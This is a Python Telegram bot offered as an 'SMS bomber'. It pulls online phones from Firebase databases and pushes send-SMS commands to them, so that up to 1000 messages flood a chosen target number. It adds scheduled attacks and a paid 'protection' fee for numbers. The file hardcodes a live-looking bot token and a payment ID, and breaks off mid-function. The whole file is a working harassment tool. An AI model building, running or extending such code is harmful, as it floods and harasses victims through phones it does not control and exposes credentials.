"""
✨ ᴍᴜʟᴛɪ-ᴄʜᴀɴɴᴇʟ ʙᴏᴍʙᴇʀ v5.3 — ᴘʀᴏ ᴇᴅɪᴛɪᴏɴ ✨
──────────────────────────────────────────────────────────
• ᴍᴜʟᴛɪ-ꜰɪʀᴇʙᴀꜱᴇ ᴇɴɢɪɴᴇ ᴡɪᴛʜ ᴀᴜᴛᴏ ᴅᴇᴠɪᴄᴇ ᴅɪꜱᴄᴏᴠᴇʀʏ
• ꜱᴛʏʟᴇᴅ ʙᴜᴛᴛᴏɴꜱ (ᴘʀɪᴍᴀʀʏ / ᴅᴀɴɢᴇʀ / ꜱᴜᴄᴄᴇꜱꜱ)
• ꜱᴍᴏᴏᴛʜ ᴀɴɪᴍᴀᴛɪᴏɴꜱ & ʀᴇᴀʟ-ᴛɪᴍᴇ ᴘʀᴏɢʀᴇꜱꜱ
• ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ꜱʏꜱᴛᴇᴍ & ᴅʙ ʙᴀᴄᴋᴜᴘ
──────────────────────────────────────────────────────────
"""
import asyncio, json, os, re, time, logging, random
from datetime import datetime, timedelta
from typing import Dict, List, Optional
import aiohttp
from aiogram import Bot, Dispatcher, F, Router, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import FSInputFile

# ══════════════════════════════════════════════════════════════
# LOGGING
# ══════════════════════════════════════════════════════════════
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s — %(message)s")
log = logging.getLogger("SMSBomber")

# ══════════════════════════════════════════════════════════════
# CONFIG
# ══════════════════════════════════════════════════════════════
BOT_TOKEN = "8231418860:AAG3XVwTZ6ZeuKUdKuFxVtin2rjiUvf3wsI"
OWNER_ID = 8679787798
DATA_FILE = "bomber_data.json"
VERSION = "v5.3"
MAX_CONCURRENT = 1000
MAX_COUNT = 1000

FORCE_JOIN_CHANNELS = ["@tchbsterarmy", "@errorarmy"]

PROTECTION_PRICE = "10 Rs"
PAYMENT_UPI = "8707210511@fam"

# ══════════════════════════════════════════════════════════════
# STYLE SUPPORT DETECTION (Telegram Bot API 9.4+)
# ══════════════════════════════════════════════════════════════
try:
    types.InlineKeyboardButton(text="t", callback_data="t", style="primary")
    STYLE_SUPPORTED = True
    log.info("✅ Styled buttons supported (Bot API 9.4+)")
except Exception:
    STYLE_SUPPORTED = False
    log.warning("⚠️ Styled buttons NOT supported by this aiogram version — falling back gracefully")

def _make_btn(text: str, callback_data: str = None, url: str = None, style: str = "primary"):
    """Create a button — with styled API when available, with safe fallback."""
    kwargs = {"text": text}
    if callback_data is not None:
        kwargs["callback_data"] = callback_data
    if url is not None:
        kwargs["url"] = url
    if style and STYLE_SUPPORTED:
        kwargs["style"] = style
    try:
        return types.InlineKeyboardButton(**kwargs)
    except Exception as e:
        # Defensive fallback if style field is rejected
        kwargs.pop("style", None)
        try:
            return types.InlineKeyboardButton(**kwargs)
        except Exception as e2:
            log.error(f"Button creation failed entirely: {e2}")
            return types.InlineKeyboardButton(text=str(text)[:60], callback_data="noop")

# ══════════════════════════════════════════════════════════════
# UI & ANIMATION HELPERS
# ══════════════════════════════════════════════════════════════
SC_MAP = {
    'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ꜰ', 'g': 'ɢ',
    'h': 'ʜ', 'i': 'ɪ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ',
    'o': 'ᴏ', 'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ', 's': 'ꜱ', 't': 'ᴛ', 'u': 'ᴜ',
    'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ', 'z': 'ᴢ'
}

def sc(text: str) -> str:
    """Converts text to small caps while preserving HTML tags and numbers"""
    if not isinstance(text, str): return str(text)
    parts = re.split(r'(<[^>]+>)', text)
    for i in range(0, len(parts), 2):
        parts[i] = "".join(SC_MAP.get(c.lower(), c) for c in parts[i])
    return "".join(parts)

def styled_box(title: str, body: str) -> str:
    return (
        f"╭─── ✧ ───────────── ✧ ───╮\n"
        f"│ ✨ {sc(title).upper()}\n"
        f"├─── ✧ ───────────── ✧ ───┤\n"
        f"{body}\n"
        f"╰─── ✧ ───────────── ✧ ───╯"
    )

# Animation frames
SPINNER_FRAMES = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
BOMB_FRAMES    = ["💣", "🧨", "💥", "🔥", "⚡", "💥"]
RADAR_FRAMES   = ["📡", "🛰️", "📶", "🔭", "📡"]
HEART_FRAMES   = ["❤️", "🧡", "💛", "💚", "💙", "💜"]
CHECK_FRAMES   = ["✔️", "✅", "☑️", "✅"]

async def animate_edit(msg: types.Message, text: str, duration: int = 2, frames: list = None):
    """Creates a loading spinner animation with customizable frame sets."""
    if frames is None:
        frames = SPINNER_FRAMES
    fps = 5
    total = max(1, duration * fps)
    for i in range(total):
        try:
            frame = frames[i % len(frames)]
            await msg.edit_text(f"<code>{frame}</code> {text}", parse_mode="HTML")
        except Exception:
            pass
        await asyncio.sleep(1.0 / fps)

async def animate_bomb(msg: types.Message, text: str, duration: int = 2):
    await animate_edit(msg, text, duration, frames=BOMB_FRAMES)

async def animate_radar(msg: types.Message, text: str, duration: int = 2):
    await animate_edit(msg, text, duration, frames=RADAR_FRAMES)

# ══════════════════════════════════════════════════════════════
# FORCE JOIN HELPERS
# ══════════════════════════════════════════════════════════════
async def check_fj(bot: Bot, user_id: int, channels: list) -> bool:
    if not channels: return True
    for ch in channels:
        try:
            m = await bot.get_chat_member(ch, user_id)
            if m.status in ["left", "kicked", None]: return False
        except Exception:
            return False
    return True

async def send_fj_ui(event, channels: list):
    text = sc("✨ ᴍᴀɴᴅᴀᴛᴏʀʏ ꜱᴜʙꜱᴄʀɪᴘᴛɪᴏɴ ✨\n\n")
    text += sc("ʏᴏᴜ ᴍᴜꜱᴛ ᴊᴏɪɴ ᴛʜᴇꜱᴇ ᴄʜᴀɴɴᴇʟꜱ ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ:\n\n")
    kb_rows = []
    for i, ch in enumerate(channels):
        text += f"🔔 <code>{ch}</code>\n"
        url = f"https://t.me/{ch.replace('@', '')}"
        kb_rows.append([_make_btn(sc(f"📢 ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ {i+1}"), url=url, style="primary")])
    kb_rows.append([_make_btn(sc("🔄 ᴠᴇʀɪꜰʏ ᴍᴇᴍʙᴇʀꜱʜɪᴘ"), callback_data="fj_verify", style="success")])
    markup = types.InlineKeyboardMarkup(inline_keyboard=kb_rows)
    if isinstance(event, types.Message):
        await event.answer(text, reply_markup=markup, parse_mode="HTML")
    else:
        await event.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

# ══════════════════════════════════════════════════════════════
# FSM STATES
# ══════════════════════════════════════════════════════════════
class Form(StatesGroup):
    fb_add_url = State()
    fb_add_api = State()
    bomb_number = State()
    bomb_message = State()
    bomb_count = State()
    schedule_number = State()
    schedule_message = State()
    schedule_count = State()
    schedule_time = State()
    schedule_name = State()
    protect_txn = State()
    protect_number = State()

# ══════════════════════════════════════════════════════════════
# STORAGE
# ══════════════════════════════════════════════════════════════
def default_data():
    return {
        "admins": [OWNER_ID],
        "firebases": [],
        "banned": [],
        "schedules": [],
        "protected_numbers": [],
        "protection_requests": [],
        "stats": {"total_sent": 0, "total_failed": 0, "total_bombings": 0}
    }

def load():
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, "r") as f:
                d = json.load(f)
            for k, v in default_data().items():
                if k not in d: d[k] = v
            return d
    except Exception as e:
        log.error(f"load() error: {e}")
    return default_data()

def save(d):
    try:
        with open(DATA_FILE, "w") as f:
            json.dump(d, f, indent=2)
    except Exception as e:
        log.error(f"save() error: {e}")

def is_admin(uid, d): return uid in d.get("admins", []) or uid == OWNER_ID
def is_banned(uid, d): return uid in d.get("banned", [])

# ══════════════════════════════════════════════════════════════
# KEYBOARD HELPERS (with styled buttons)
# ══════════════════════════════════════════════════════════════
def kb(rows):
    """
    Build keyboard from rows.
    Row item formats:
      (text, callback)                -> primary
      (text, callback, style)         -> styled
      {"text":..., "callback":..., "url":..., "style":...}
    """
    keyboard = []
    for row in rows:
        btn_row = []
        for item in row:
            try:
                if isinstance(item, tuple):
                    text = item[0]
                    cb = item[1] if len(item) > 1 else None
                    style = item[2] if len(item) > 2 else "primary"
                    # If item[1] looks like a URL, treat as url
                    if cb and isinstance(cb, str) and cb.startswith("http"):
                        btn_row.append(_make_btn(text, url=cb, style=style))
                    else:
                        btn_row.append(_make_btn(text, callback_data=cb, style=style))
                elif isinstance(item, dict):
                    btn_row.append(_make_btn(
                        item.get("text", ""),
                        callback_data=item.get("callback"),
                        url=item.get("url"),
                        style=item.get("style", "primary")
                    ))
            except Exception as e:
                log.warning(f"kb() button error: {e}")
        if btn_row: keyboard.append(btn_row)
    return types.InlineKeyboardMarkup(inline_keyboard=keyboard)

# ══════════════════════════════════════════════════════════════
# FIREBASE HELPERS
# ══════════════════════════════════════════════════════════════
async def fb_get(base: str, path: str, api_key: str = "") -> dict:
    url = base.rstrip("/") + path
    if api_key: url += f"?auth={api_key}"
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=15) as r:
                if r.status == 200:
                    txt = await r.text()
                    return {} if txt == "null" or txt == "" else json.loads(txt)
    except Exception as e:
        log.error(f"fb_get error: {e}")
    return {}

async def fb_put(base: str, path: str, payload: dict, api_key: str = "") -> bool:
    url = base.rstrip("/") + path
    if api_key: url += f"?auth={api_key}"
    for attempt in range(3):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url, json=payload, timeout=15) as r:
                    if 200 <= r.status < 300: return True
        except Exception as e:
            log.warning(f"fb_put error: {e}")
        await asyncio.sleep(0.5 * (attempt + 1))
    return False

# ══════════════════════════════════════════════════════════════
# CORE BOMBING ENGINE
# ══════════════════════════════════════════════════════════════
def is_device_online(device_data: dict) -> bool:
    for flag in ["isOnline", "online", "connected", "status"]:
        if flag in device_data and device_data[flag] in (True, 1, "online", "active", "true"):
            return True
    return False

async def discover_online_devices(fb: dict) -> List[dict]:
    data = await fb_get(fb["url"], "/clients.json", fb.get("api_key", ""))
    if not data or not isinstance(data, dict): return []
    devices = []
    for device_id, device_data in data.items():
        if not is_device_online(device_data): continue
        sims = device_data.get("sims", [])
        if not sims:
            sims = [{"simSlotIndex": 0, "phoneNumber": device_data.get("phoneNumber", "")}]
        for sim in sims:
            devices.append({
                "fb_id": fb["id"], "fb_url": fb["url"], "api_key": fb.get("api_key", ""),
                "device_id": device_id, "device_name": device_data.get("deviceName", device_id),
                "sim_slot": sim.get("simSlotIndex", 0), "phone_number": sim.get("phoneNumber", ""),
                "battery": device_data.get("battery", 0)
            })
    return devices

async def discover_all_devices(firebases: List[dict]) -> List[dict]:
    tasks = [discover_online_devices(fb) for fb in firebases]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    all_devices = []
    for res in results:
        if isinstance(res, list): all_devices.extend(res)
    return all_devices

async def send_single_sms(device: dict, to: str, message: str) -> tuple:
    payload = {
        "from": device["sim_slot"], "to": to.strip(), "message": message.strip(),
        "isSended": False, "timestamp": int(time.time()),
        "deviceId": device["device_id"], "simSlot": device["sim_slot"]
    }
    path = f"/clients/{device['device_id']}/webhookEvent/sendSms.json"
    success = await fb_put(device["fb_url"], path, payload, device.get("api_key", ""))
    return success, device["device_name"], device["device_id"]

_bombing_tasks = {}
_bombing_status = {}

async def bomber_worker(bot, user_id: int, number: str, message: str, count: int, schedule_id: str = None):
    d = load()
    firebases = d.get("firebases", [])
    if not firebases:
        await bot.send_message(user_id, sc("ғɪʀᴇʙᴀꜱᴇꜱ ᴅᴇᴠɪᴄᴇ ᴀᴅᴅ ᴋᴀʀᴏ, ʙᴀᴀᴅ ᴍᴇ ᴋᴀʀᴇ 🚫"))
        return

    status_msg = await bot.send_message(user_id, sc("🔍 ᴅᴇᴠɪᴄᴇꜱ sᴄᴀɴɴɪɴɢ..."), parse_mode="HTML")
    await animate_radar(status_msg, sc("ꜱᴄᴀɴɴɪɴɢ ᴅᴇᴠɪᴄᴇꜱ..."), 2)

    all_devices = await discover_all_devices(firebases)
    if not all_devices:
        await status_msg.edit_text(sc("ᴏɴʟɪɴᴇ ᴅᴇᴠɪᴄᴇ ɴᴀʜɪ ᴍɪʟᴀ!"), parse_mode="HTML")
        return

    await status_msg.edit_text(
        styled_box("ʙᴏᴍʙɪɴɢ ᴘʀᴏɢʀᴇꜱꜱ",
        f"📱 {sc('ᴏɴʟɪɴᴇ ᴅᴇᴠɪᴄᴇꜱ')}: <b>{len(all_devices)}</b>\n"
        f"🎯 {sc('ᴛᴀʀɢᴇᴛ ᴄᴏᴜɴᴛ')}: <b>{count}</b>\n"
        f"📞 {sc('ᴛᴀʀɢᴇᴛ')}: <code>{number}</code>\n\n"
        f"<i>{sc('ɪɴɪᴛɪᴀᴛɪɴɢ...')}</i>"), parse_mode="HTML")

    sent, failed, start_time = 0, 0, time.time()
    _bombing_status[user_id] = {
        "total": count, "sent": 0, "failed": 0,
        "devices": len(all_devices), "start": start_time,
        "running": True, "number": number
    }

    total_devices = len(all_devices)
    device_index = 0
    last_progress = -1

    for i in range(count):
        # Cancellation check
        if user_id in _bombing_tasks and _bombing_tasks[user_id].cancelled():
            break

        device = all_devices[device_index % total_devices]
        device_index += 1
        try:
            success, _, _ = await send_single_sms(device, number, message)
        except Exception as e:
            log.warning(f"send error: {e}")
            success = False

        if success: sent += 1
        else: failed += 1

        _bombing_status[user_id]["sent"] = sent
        _bombing_status[user_id]["failed"] = failed

        progress = int((sent + failed) / count * 100)
        if progress // 10 != last_progress // 10 or (sent + failed) >= count:
            last_progress = progress
            try:
                bar_len = 15
                filled = int(bar_len * (sent + failed) / count)
                bar = "█" * filled + "░" * (bar_len - filled)
                await status_msg.edit_text(
                    styled_box("ʙᴏᴍʙɪɴɢ ɪɴ ᴘʀᴏɢʀᴇꜱꜱ",
                    f"📞 <code>{number}</code>\n"
                    f"✅ {sc('ꜱᴇɴᴛ')}: <b>{sent}</b> | ❌ {sc('ꜰᴀɪʟᴇᴅ')}: <b>{failed}</b>\n"
                    f"📊 <code>{bar}</code> {progress}%\n"
                    f"⏱ {sc('ᴛɪᴍᴇ')}: {int(time.time() - start_time)}s\n\n"
                    f"<i>{sc('ᴜꜱᴇ /stop ᴛᴏ ᴄᴀɴᴄᴇʟ')}</i>"), parse_mode="HTML")
            except Exception:
                pass

        await asyncio.sleep(0.05)

    _bombing_status[user_id]["running"] = False
    d = load()
    d["stats"]["total_sent"] += sent
    d["stats"]["total_failed"] += failed
    d["stats"]["total_bombings"] += 1
    save(d)

    final_msg = styled_box("ʙᴏᴍʙɪɴɢ ᴄᴏᴍᴘʟᴇᴛᴇ",
        f"📞 <code>{number}</code>\n"
        f"✅ {sc('ꜱᴇɴᴛ')}: <b>{sent}</b>\n"
        f"❌ {sc('ꜰᴀɪʟᴇᴅ')}: <b>{failed}</b>\n"
        f"⏱ {sc('ᴛɪᴍᴇ')}: {int(time.time() - start_time)}s\n"
        f"📈 {sc('ꜱᴜᴄᴄᴇꜱꜱ ʀᴀᴛᴇ')}: <b>{round(sent/(sent+failed)*100, 1) if sent+failed>0 else 0}%</b>")

    try:
        await bot.send_message(user_id, final_msg, parse_mode="HTML")
    except Exception:
        try:
            await bot.send_message(user_id, f"✅ Sent: {sent}, Failed: {failed}")
        except Exception:
            pass

    if user_id in _bombing_tasks:
        del _bombing_tasks[user_id]

async def start_bombing(bot, user_id: int, number: str, message: str, count: int, schedule_id: str = None):
    if user_id in _bombing_tasks:
        try:
            _bombing_tasks[user_id].cancel()
        except Exception:
            pass
        await asyncio.sleep(0.5)
    task = asyncio.create_task(bomber_worker(bot, user_id, number, message, count, schedule_id))
    _bombing_tasks[user_id] = task
    return task

def stop_bombing(user_id: int) -> bool:
    if user_id in _bombing_tasks:
        try:
            _bombing_tasks[user_id].cancel()
        except Exception:
            pass
        del _bombing_tasks[user_id]
        return True
    return False

# ══════════════════════════════════════════════════════════════
# SCHEDULER ENGINE
# ══════════════════════════════════════════════════════════════
_scheduler_running = False
_scheduler_task = None

def parse_time_string(time_str: str) -> int:
    time_str = time_str.strip().lower()
    pattern = r'(\d+)([dhm])'
    matches = re.findall(pattern, time_str)
    if matches:
        total = 0
        for value, unit in matches:
            if unit == 'd': total += int(value) * 86400
            elif unit == 'h': total += int(value) * 3600
            elif unit == 'm': total += int(value) * 60
        return total
    if time_str.endswith('m'): return int(time_str[:-1]) * 60
    elif time_str.endswith('h'): return int(time_str[:-1]) * 3600
    elif time_str.endswith('d'): return int(time_str[:-1]) * 86400
    else:
        try: return int(time_str) * 60
        except Exception: return 0

def format_time_remaining(seconds: int) -> str:
    if seconds < 60: return f"{seconds}s"
    elif seconds < 3600: return f"{seconds // 60}m {seconds % 60}s"
    elif seconds < 86400: return f"{seconds // 3600}h {(seconds % 3600) // 60}m"
    else: return f"{seconds // 86400}d {(seconds % 86400) // 3600}h"

async def schedule_worker(bot):
    global _scheduler_running
    while _scheduler_running:
        try:
            d = load()
            for sched in d.get("schedules", []):
                if sched.get("status") != "pending": continue
                try:
                    if datetime.now() >= datetime.fromisoformat(sched["time"]):
                        await start_bombing(bot, OWNER_ID, sched["number"], sched["message"], sched["count"], sched["id"])
                except Exception:
                    continue
            await asyncio.sleep(10)
        except Exception as e:
            log.error(f"Scheduler error: {e}")
            await asyncio.sleep(30)

async def start_scheduler(bot):
    global _scheduler_running, _scheduler_task
    if _scheduler_running: return
    _scheduler_running = True
    _scheduler_task = asyncio.create_task(schedule_worker(bot))

async def stop_scheduler():
    global _scheduler_running, _scheduler_task
    _scheduler_running = False
    if _scheduler_task:
        try:
            _scheduler_task.cancel()
        except Exception:
            pass

# ══════════════════════════════════════════════════════════════
# KEYBOARDS (Styled)
# ══════════════════════════════════════════════════════════════
def main_menu(uid, d):
    rows = []
    if is_admin(uid, d):
        rows.append([(sc("🛡 ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ"), "admin:panel", "primary")])
    rows.append([(sc("💣 ꜱᴛᴀʀᴛ ʙᴏᴍʙɪɴɢ"), "bomb:start", "danger")])
    rows.append([(sc("🛡️ ᴘʀᴏᴛᴇᴄᴛ ɴᴜᴍʙᴇʀ"), "protect:start", "success")])
    rows.append([
        (sc("📊 ᴍʏ ꜱᴛᴀᴛꜱ"), "stats:show", "primary"),
        (sc("📡 ʟɪᴠᴇ ꜱᴛᴀᴛᴜꜱ"), "status:show", "primary")
    ])
    rows.append([(sc("❓ ʜᴇʟᴘ"), "help:show", "primary")])
    return kb(rows)

def admin_panel_kb(d):
    pending_reqs = len([r for r in d.get("protection_requests", []) if r.get("status") == "pending"])
    return kb([
        [(sc("➕ ᴀᴅᴅ ꜰɪʀᴇʙᴀꜱᴇ"), "admin:fb_add", "success"),
         (sc("📋 ʟɪꜱᴛ ɴᴏᴅᴇꜱ"), "admin:fb_list", "primary")],
        [(sc("📅 ꜱᴄʜᴇᴅᴜʟᴇ ʙᴏᴍʙ"), "admin:schedule", "success"),
         (sc("📋 ᴍᴀɴᴀɢᴇ ꜱᴄʜᴇᴅᴜʟᴇꜱ"), "admin:schedule_list", "primary")],
        [(sc(f"🛡️ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ({pending_reqs})"), "admin:protection", "primary")],
        [(sc("📡 ʟɪᴠᴇ ꜱᴛᴀᴛᴜꜱ"), "admin:status", "primary"),
         (sc("📊 ɢʟᴏʙᴀʟ ꜱᴛᴀᴛꜱ"), "admin:stats", "primary")],
        [(sc("👥 ᴀᴅᴍɪɴꜱ"), "admin:admins", "primary")],
        [(sc("🚫 ʙᴀɴ ᴜꜱᴇʀ"), "admin:ban", "danger"),
         (sc("✅ ᴜɴʙᴀɴ ᴜꜱᴇʀ"), "admin:unban", "success")],
        [(sc("💾 ʙᴀᴄᴋᴜᴘ/ʀᴇꜱᴛᴏʀᴇ"), "admin:db_tools", "primary")],
        [(sc("🔙 ʙᴀᴄᴋ"), "home", "danger")]
    ])

def back_button(callback: str = "home"):
    return kb([[("◀️ " + sc("ʙᴀᴄᴋ"), callback, "danger")]])

# ══════════════════════════════════════════════════════════════
# ROUTER
# ══════════════════════════════════════════════════════════════
R = Router()

# ── Start ──────────────────────────────────────────────────────
@R.message(Command("start"))
async def cmd_start(msg: types.Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    d = load()

    if not await check_fj(msg.bot, uid, FORCE_JOIN_CHANNELS):
        await send_fj_ui(msg, FORCE_JOIN_CHANNELS)
        return

    if is_banned(uid, d):
        await msg.answer(sc("🚫 ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ!"))
        return

    fb_count = len(d.get("firebases", []))
    text = styled_box("ᴍᴜʟᴛɪ-ᴄʜᴀɴɴᴇʟ ʙᴏᴍʙᴇʀ ɢᴀᴛᴇᴡᴀʏ",
        f"💣 {sc('ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ ʙᴏᴍʙᴇʀ')}\n"
        f"📱 {sc('ᴏɴʟɪɴᴇ-ᴅɪꜱᴄᴏᴠᴇʀʏ ᴇɴɢɪɴᴇ')}\n"
        f"🚀 {sc('ᴘᴀʀᴀʟʟᴇʟ ꜱᴇɴᴅ ᴛᴏ ᴍᴀx ᴅᴇᴠɪᴄᴇꜱ')}\n\n"
        f"📡 {sc('ʟɪᴠᴇ ꜱᴛᴀᴛᴜꜱ')}: <b>{fb_count}</b>\n"
        f"📅 {sc('ꜱᴄʜᴇᴅᴜʟᴇꜱ')}: <b>{len(d.get('schedules', []))}</b>\n\n"
        f"<i>{sc('ᴜꜱᴇ /stop ᴛᴏ ᴄᴀɴᴄᴇʟ ʙᴏᴍʙɪɴɢ ᴀɴʏᴛɪᴍᴇ')}</i>")
    await msg.answer(text, reply_markup=main_menu(uid, d), parse_mode="HTML")

# ── Stop ────────────────────────────────────────────────────────
@R.message(Command("stop"))
async def cmd_stop(msg: types.Message):
    if stop_bombing(msg.from_user.id):
        await msg.answer(sc("⏹ ʙᴏᴍʙɪɴɢ ꜱᴛᴏᴘᴘᴇᴅ!"), parse_mode="HTML")
    else:
        await msg.answer(sc("ℹ️ ɴᴏ ᴀᴄᴛɪᴠᴇ ʙᴏᴍʙɪɴɢ ᴛᴏ ꜱᴛᴏᴘ."))

# ── Force Join Verify ──────────────────────────────────────────
@R.callback_query(F.data == "fj_verify")
async def cb_fj_verify(cq: types.CallbackQuery):
    if await check_fj(cq.bot, cq.from_user.id, FORCE_JOIN_CHANNELS):
        await cq.answer(sc("✅ ᴠᴇʀɪꜰɪᴇᴅ! ᴡᴇʟᴄᴏᴍᴇ ʙᴀᴄᴋ."), show_alert=True)
        try:
            state = await cq.bot.get_state(cq.from_user.id)
        except Exception:
            state = None
        await cb_home(cq, state)
    else:
        await cq.answer(sc("❌ ʏᴏᴜ ʜᴀᴠᴇɴ'ᴛ ᴊᴏɪɴᴇᴅ ʏᴇᴛ!"), show_alert=True)

# ── Help ────────────────────────────────────────────────────────
@R.callback_query(F.data == "help:show")
async def cb_help(cq: types.CallbackQuery):
    await cq.answer()
    text = styled_box("ᴄᴏᴍᴍᴀɴᴅ ᴄᴇɴᴛᴇʀ",
        f"1️⃣ {sc('ᴛᴀᴘ 💣 ꜱᴛᴀʀᴛ ʙᴏᴍʙɪɴɢ')}\n"
        f"2️⃣ {sc('ᴘʀᴏᴠɪᴅᴇ ᴛᴀʀɢᴇᴛ (ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ ᴡɪᴛʜ sᴛᴀʀᴛ)')}\n"
        f"3️⃣ {sc('ᴇɴᴛᴇʀ ᴍᴇꜱꜱᴀɢᴇ')}\n"
        f"4️⃣ {sc('ᴄʜᴏᴏꜱᴇ ᴄᴏᴜɴᴛ (ᴍᴀx 1000)')}\n\n"
        f"⚡ {sc('ꜰᴇᴀᴛᴜʀᴇꜱ')}\n"
        f"• {sc('ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ ʙᴏᴍʙɪɴɢ')}\n"
        f"• {sc('ᴘᴀʀᴀʟʟᴇʟ ᴅᴇʟɪᴠᴇʀʏ (ᴜᴘ ᴛᴏ 1000)')}\n"
        f"• {sc('ʀᴇᴀʟ-ᴛɪᴍᴇ ᴘʀᴏɢʀᴇꜱꜱ & ᴀɴɪᴍᴀᴛɪᴏɴꜱ')}\n"
        f"• {sc('ɴᴜᴍʙᴇʀ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ꜱʏꜱᴛᴇᴍ')}")
    try:
        await cq.message.edit_text(text, reply_markup=back_button(), parse_mode="HTML")
    except Exception:
        pass

# ── Home ────────────────────────────────────────────────────────
@R.callback_query(F.data == "home")
async def cb_home(cq: types.CallbackQuery, state: FSMContext = None):
    if state:
        try:
            await state.clear()
        except Exception:
            pass
    uid = cq.from_user.id
    d = load()

    if not await check_fj(cq.bot, uid, FORCE_JOIN_CHANNELS):
        await send_fj_ui(cq, FORCE_JOIN_CHANNELS)
        return

    fb_count = len(d.get("firebases", []))
    text = styled_box("ᴍᴜʟᴛɪ-ᴄʜᴀɴɴᴇʟ ʙᴏᴍʙᴇʀ ɢᴀᴛᴇᴡᴀʏ",
        f"💣 {sc('ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ ʙᴏᴍʙᴇʀ')}\n"
        f"📡 {sc('ʟɪᴠᴇ ꜱᴛᴀᴛᴜꜱ')}: <b>{fb_count}</b>\n"
        f"📅 {sc('ꜱᴄʜᴇᴅᴜʟᴇꜱ')}: <b>{len(d.get('schedules', []))}</b>\n\n"
        f"<i>{sc('ᴜꜱᴇ /stop ᴛᴏ ᴄᴀɴᴄᴇʟ ʙᴏᴍʙɪɴɢ ᴀɴʏᴛɪᴍᴇ')}</i>")
    try:
        await cq.message.edit_text(text, reply_markup=main_menu(uid, d), parse_mode="HTML")
    except Exception:
        pass

# ── Live Status ─────────────────────────────────────────────────
@R.callback_query(F.data == "status:show")
async def cb_status(cq: types.CallbackQuery):
    d = load()
    firebases = d.get("firebases", [])
    if not firebases:
        await cq.answer(sc("❌ ɴᴏ ꜰɪʀᴇʙᴀꜱᴇꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ!"), show_alert=True)
        return

    await cq.answer(sc("🔍 ꜱᴄᴀɴɴɪɴɢ ᴅᴇᴠɪᴄᴇꜱ..."))
    await animate_radar(cq.message, sc("ꜰᴇᴛᴄʜɪɴɢ ᴅᴇᴠɪᴄᴇꜱ..."), 2)

    all_devices = await discover_all_devices(firebases)
    text = styled_box("ʟɪᴠᴇ ᴛᴇʟᴇᴍᴇᴛʀʏ", f"📱 {sc('ᴛᴏᴛᴀʟ ᴅᴇᴠɪᴄᴇꜱ')}: <b>{len(all_devices)}</b>\n\n")

    for i, fb in enumerate(firebases):
        fb_devices = [d for d in all_devices if d["fb_id"] == fb["id"]]
        text += f"🔘 {sc('ɴᴏᴅᴇ')} #{i+1}: 🟢 <b>{len(fb_devices)}</b> {sc('ᴏɴʟɪɴᴇ')}\n"

    text += f"\n🕐 {sc('ʟᴀꜱᴛ ꜱʏɴᴄ')}: {datetime.now().strftime('%H:%M:%S')}"
    try:
        await cq.message.edit_text(text, reply_markup=back_button(), parse_mode="HTML")
    except Exception:
        pass

# ── Stats ───────────────────────────────────────────────────────
@R.callback_query(F.data == "stats:show")
async def cb_stats(cq: types.CallbackQuery):
    uid = cq.from_user.id
    status = _bombing_status.get(uid, {})
    if status and status.get("running"):
        elapsed = int(time.time() - status.get("start", time.time()))
        text = styled_box("ᴀᴄᴛɪᴠᴇ ʙᴏᴍʙɪɴɢ",
            f"📞 <code>{status.get('number', '?')}</code>\n"
            f"✅ {sc('ꜱᴇɴᴛ')}: <b>{status.get('sent', 0)}</b>\n"
            f"❌ {sc('ꜰᴀɪʟᴇᴅ')}: <b>{status.get('failed', 0)}</b>\n"
            f"📱 {sc('ᴅᴇᴠɪᴄᴇꜱ')}: <b>{status.get('devices', 0)}</b>\n"
            f"⏱ {sc('ᴇʟᴀᴘꜱᴇᴅ')}: {elapsed}s")
    else:
        d = load()
        gs = d.get("stats", {"total_sent": 0, "total_failed": 0, "total_bombings": 0})
        text = styled_box("ɢʟᴏʙᴀʟ ꜱᴛᴀᴛɪꜱᴛɪᴄꜱ",
            f"🔘 {sc('ɴᴏᴅᴇꜱ')}: <b>{len(d.get('firebases', []))}</b>\n"
            f"✅ {sc('ᴛᴏᴛᴀʟ ꜱᴇɴᴛ')}: <b>{gs.get('total_sent', 0)}</b>\n"
            f"❌ {sc('ᴛᴏᴛᴀʟ ꜰᴀɪʟᴇᴅ')}: <b>{gs.get('total_failed', 0)}</b>\n"
            f"💣 {sc('ʙᴏᴍʙɪɴɢꜱ ʀᴜɴ')}: <b>{gs.get('total_bombings', 0)}</b>")
    try:
        await cq.message.edit_text(text, reply_markup=back_button(), parse_mode="HTML")
    except Exception:
        pass

# ── Bombing Flow ────────────────────────────────────────────────
@R.callback_query(F.data == "bomb:start")
async def cb_bomb_start(cq: types.CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()

    if not await check_fj(cq.bot, uid, FORCE_JOIN_CHANNELS):
        await send_fj_ui(cq, FORCE_JOIN_CHANNELS)
        return

    if not d.get("firebases"):
